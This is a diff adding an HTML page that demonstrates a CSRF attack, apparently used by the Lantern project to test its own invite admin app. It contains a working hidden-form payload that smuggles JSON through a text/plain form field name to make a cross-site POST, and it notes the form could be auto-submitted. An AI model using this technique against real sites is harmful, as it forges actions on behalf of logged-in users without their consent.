@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html ng-app="lanternAttacker">
+
+  <head>
+    <meta charset="UTF-8" />
+    <script data-require="jquery@*" data-semver="2.0.3" src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.js"></script>
+    <script data-require="angular.js@*" data-semver="1.2.0-rc3-nonmin" src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.0-rc.3/angular.js"></script>
+    <!--<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.0-rc.3/angular-cookies.js"></script>-->
+    <link data-require="bootstrap-css@*" data-semver="3.0.0" rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" />
+    <style>body{padding: 80px;}li{padding: 5px;}</style>
+    <script src="csrf.js"></script>
+  </head>
+
+  <body>
+    <h1>CSRF Attack Demonstration</h1>
+    <ol>
+      <li>Log in to <a href="https://pantsctrl.appspot.com/admin/invites.html">https://pantsctrl.appspot.com/admin/invites.html</a>
+          in another tab.</li>
+      <li>Click the "query" button. Upon response, you should get an XSRF-TOKEN cookie that your
+          browser will now send with future requests to https://pantsctrl.appspot.com. This attack
+          also assumes there is an invite in the datastore from lanternfriend@gmail.com to
+          lanternuser@gmail.com. If there isn't already, you can create one by running
+          <code>./run.bash --controller-id=pantsctrl</code>, signing in as the lanternfriend
+          account, and adding lanternuser as a Lantern Friend.</li>
+      <li>Come back to this tab, pretending that an attacker has lured you here.
+          <button class="btn btn-xs" fetch-invites>Click here</button> to add
+          <code>&lt;img src="https://pantsctrl.appspot.com/admin/rest/invites/pending"&gt;</code>
+          to the DOM if you'd like to verify that your browser is sending a valid XSRF token to the
+          target domain (inspect the resulting request in the network tab of your developer tools
+          and look at the cookie header that was sent with the request.
+      </li>
+      <li>
+          Submit this form (which the attacker could hide and trick you into doing)
+          to POST to <a ng-href="url">{{url}}</a> with a payload of {{payload|json}}.
+          (The attacker could do this on page load rather than waiting for you to click the button.)
+
+          <form method="POST" action="{{url}}?attack" enctype="text/plain">
+            <input type="hidden" name='{{payload|json}}//' value="dummy just ignore this">
+            <input type="submit" autofocus class="btn btn-primary" value="Attack" />
+          </form>
+      </li>
+    </ol>
+  </body>
+</html>
